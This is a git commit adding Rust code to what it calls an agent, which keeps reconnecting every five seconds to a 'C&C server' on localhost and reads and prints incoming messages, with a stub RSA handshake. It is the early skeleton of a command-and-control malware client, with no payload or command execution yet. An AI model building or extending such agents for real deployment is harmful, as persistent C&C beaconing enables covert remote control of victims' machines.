b7ec2e389e66ed83e8634b2ff549df06607e8883
TheOnlyArtz <callcraft456@gmail.com>
2021-02-26 17:55:26 +0200

    Connection persistance

--- agent/src/main.rs
+++ agent/src/main.rs
@@ -1,11 +1,47 @@
+use tokio::signal;
+use tokio::io::AsyncWriteExt;
+use std::time::Duration;
+use std::thread;
+
 mod socket;
 
-const IP: &'static str = "0.0.0.0";
+const IP: &'static str = "127.0.0.1";
 const PORT: u16 = 8080;
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let connection = socket::connect_to_cnc(IP, PORT).await?;
+    // This is a reconnection loop if something goes wrong.
+    loop {
+        thread::sleep(Duration::from_millis(5000));
+        // connect to the socket
+        let connection = socket::connect_to_cnc(IP, PORT).await;
+        if let Err(e) = connection {continue} // Break if connection refused.
+        println!("Connected to C&C server successfully");
+        let stream = socket::SocketStream::new(connection.unwrap());
+        // Message reading loop
+        loop {
+            let msg = stream.consume_message().await;
 
+            if let Err(ref e) = msg {
+                if e.kind() == std::io::ErrorKind::WouldBlock {
+                    continue
+                }
+                break
+            } // this error probably indicates about block of the read abilities.
+
+            let (msg, n_bytes) = msg.unwrap();
+            
+            if n_bytes == 0 {
+                break // try to reconnect
+            }
+
+            println!("Msg -> {}", String::from_utf8(msg)?);
+        }
+
+        eprintln!("Disconnected, trying to reconnect in 5 seconds...");
+        thread::sleep(Duration::from_millis(5000))
+    }
+
+    signal::ctrl_c().await?;
     Ok(())
 }
--- agent/src/socket.rs
+++ agent/src/socket.rs
@@ -1,7 +1,62 @@
 use tokio::net::TcpStream;
 
+pub enum SocketState {
+    Handshake(HandshakeState),
+    Operational
+}
+
+pub enum HandshakeState {
+    ServerHello, // RSA public key
+}
+
+pub struct SocketStream {
+    pub stream: TcpStream,
+    state: SocketState,
+}
+
+impl SocketStream {
+    pub fn new(stream: TcpStream) -> Self {
+        Self {
+            stream,
+            state: SocketState::Handshake(HandshakeState::ServerHello)
+        }
+    }
+
+    pub async fn consume_message(&self) -> Result<(Vec<u8>, usize), std::io::Error> {
+        let mut data = vec![0; 1024];
+
+        match self.stream.try_read(&mut data) {
+            Err(e) => return Err(e),
+            Ok(n_bytes) => {
+                if n_bytes == 0 {
+                    println!("Agent closed connection !");
+                    return Ok((vec![0u8], 0));
+                }
+                
+                Ok((data, n_bytes))
+            },
+        }
+    }
+
+    pub async fn handle_msg(&self, msg: Vec<u8>) {
+        match &self.state { 
+            SocketState::Handshake(handshake_state) => {
+                match handshake_state {
+                    ServerHello => {
+
+                    },
+                }
+            },
+            SocketState::Operational => {}
+        }
+    }
+}
 pub async fn connect_to_cnc(ip: &str, port: u16) -> Result<TcpStream, Box<dyn std::error::Error>> {
     let stream = TcpStream::connect(&format!("{}:{}", ip, port)).await?;
 
     Ok(stream)
+}
+
+pub async fn start_handshake() {
+    
 }
